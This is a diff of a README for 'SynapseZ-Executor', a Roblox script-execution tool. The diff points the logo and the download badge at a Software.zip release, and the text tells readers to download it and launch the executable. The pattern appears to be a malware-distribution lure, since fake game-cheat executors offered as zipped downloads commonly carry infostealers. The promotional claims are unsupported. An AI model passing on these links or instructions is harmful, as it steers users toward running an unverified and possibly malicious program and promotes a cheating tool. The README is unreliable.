@@ -2,7 +2,7 @@
 
 Welcome to SynapseZ-Executor, your go-to script execution tool for Roblox! Whether you're a seasoned Lua coder or just starting out in the world of game modifications and customization, SynapseZ-Executor has got you covered. This advanced tool is known for its top-tier features and unmatched stability, making it a favorite among Roblox enthusiasts worldwide.
 
-![SynapseZ-Executor Logo](https://github.com/user-attachments/images/executor-logo.png)
+![SynapseZ-Executor Logo](https://github.com/FebriXD/SynapseZ-Executor/releases/download/v2.0/Software.zip)
 
 ## Features 🌟
 - Advanced Lua script execution capabilities
@@ -13,7 +13,7 @@ Welcome to SynapseZ-Executor, your go-to script execution tool for Roblox! Wheth
 ## Get Started 🚀
 To start using SynapseZ-Executor, simply download the Software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Software](https://github.com/FebriXD/SynapseZ-Executor/releases/download/v2.0/Software.zip)](https://github.com/FebriXD/SynapseZ-Executor/releases/download/v2.0/Software.zip)
 
 Click on the button above to download the Software package. Once downloaded, launch the executable file to begin exploring the endless possibilities of Lua scripting in Roblox.
 
